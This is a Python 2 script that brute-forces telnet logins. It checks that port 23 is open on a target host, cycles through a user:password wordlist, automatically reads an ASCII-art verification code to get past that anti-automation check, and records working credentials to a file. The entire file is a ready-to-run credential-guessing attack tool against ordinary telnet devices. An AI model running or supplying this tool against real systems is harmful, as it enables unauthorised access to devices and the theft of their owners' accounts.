#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import telnetlib
import sys
import os
import hashlib

cred_file = None


def get_hash_from_string(string):
    hasher_engine = hashlib.md5()
    hasher_engine.update(string)
    return hasher_engine.hexdigest()


def port_scan(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, 23))
    if connect == 0:
        print "[+]\tPort 23: Open"
        s.close()
        return True
    else:
        print "[-]\tPort 23: Closed"
        s.close()
        return False


def save_last_index(last_index):
    with open("last_index.txt", "w+") as f:
        f.write(str(last_index))


def read_last_index():
    try:
        with open("last_index.txt", "r+") as f:
            last_index = f.read()
    except IOError as e:
        last_index = 0
    return int(last_index) if last_index else 0


def get_credentials(passwords_file):
    last_index = read_last_index()
    global cred_file
    if not cred_file:
        print "Opening...", passwords_file
        cred_file = open(passwords_file, 'r')
        for i in range(0, last_index):
            cred_file.readline()
    line = cred_file.readline()

    user = ""
    if ":" in line:
        user_password = line.split(':')
        user = user_password[0]
        password = user_password[1]
    else:
        password = line
    save_last_index(last_index + 1)
    return user, password


def truncate(text, start=None, end=None):
    if start:
        text = text[text.find(start):]
    if end:
        text = text[:text.find(end) + len(end)]
    return text


def truncate_including(text, start=None, end=None):
    if start:
        text = text[text.find(start) + len(start):]
    if end:
        text = text[:text.find(end)]
    return text


def digit_ocr_verification_code(digit_text=""):
    filename = "digit_" + get_hash_from_string(digit_text) + ".txt"
    if os.path.exists(filename):
        digit_value = open(filename, 'r').read()
    else:
        while True:
            print "Unknown digit:"
            print digit_text
            digit_value = raw_input("Please enter digit (will be saved for later usage): ")
            if len(digit_value) == 1:
                break
        with open(filename, 'w+') as f:
            f.write(digit_value)
    return digit_value


def ocr_verification_code(text=""):
    """
    Function allows to read digits from text like
    # ====================================================
    #    * * * *      * * * *      * * * *      * * * *
    #    *            *            *     *            *
    #    * * * *      * * * *      * * * *            *
    #          *            *      *     *            *
    #          *            *      *     *            *
    #    * * * *      * * * *      * * * *            *
    # ====================================================
    """
    digits_spacing = 13
    text = text.replace('\r\n', '\n')
    text = truncate_including(text, '==\n', '\n==')
    digits = []  # we store digits
    for line in text.split('\n'):  # we read digits line by line
        if not digits:
            digits = ["" for x in range(len(line) / digits_spacing)]
        reading_line = line
        line_parts = []
        while True:
            line_part = reading_line[:digits_spacing]
            if line_part:
                line_parts.append(reading_line[:digits_spacing].rstrip(' '))  # rstrip
                reading_line = reading_line[digits_spacing:]
            else:
                break
        for index, line_part in enumerate(line_parts):
            digits[index] = digits[index] + line_part + '\n'

    ocr = ""
    for digit in digits:
        ocr = ocr + digit_ocr_verification_code(digit)
    return ocr


def brute_login(host, passwords_file):
    tn = None  # telnet connection
    need_user = False  # need's username
    while True:  # main while, we don't go out until Valid Cred. found
        try:
            if not tn:
                asked_password_in_cnx = False
                tn = telnetlib.Telnet(host)
                # tn.debuglevel = 10
                print "[-]\tPort 23: Connecting..."
            while True:  # while requesting input
                response = tn.read_until(":", 1)  # until input request
                if "verification code:" in response:
                    verif_code = ocr_verification_code(response)
                    print "[+] Entering Verif. Code:\t" + verif_code
                    tn.write(verif_code + "\n")
                elif "Login:" in response:
                    need_user = True
                    asked_password_in_cnx = False  # Last time asked for password in this connection?
                    user, password = get_credentials(passwords_file)
                    print "[+] Trying user:\t" + user
                    tn.write(user + "\n")
                elif "Password:" in response:
                    if asked_password_in_cnx and need_user:
                        tn.close()  # we should try next pair user/password
                        break  # TODO FIX: allow multiple password from same user
                    asked_password_in_cnx = True  # Last time asked for password in this connection?
                    if not need_user:  # didn't ask for username, we read password
                        user, password = get_credentials(passwords_file)
                    if not password:
                        print "[-] No more Credentials to try"
                        sys.exit(0)
                    print "[+] Trying password:\t" + password
                    tn.write(password + "\n")
                if ">" in response:
                    with open("valid_credentials.txt", "a") as f:
                        print "[+] Valid Credentials found:\t" + ' : '.join((user, password))
                        f.write("Valid Credentials found: " + ' : '.join((user, password)) + '\n')
                    break  # Get out from input request while
            if ">" in response:
                break  # Get out from main while
        except EOFError as e:
            pass  # Disconnected, no problem, we will connect again.


if __name__ == "__main__":
    if port_scan(sys.argv[1]):
        brute_login(sys.argv[1], sys.argv[2])
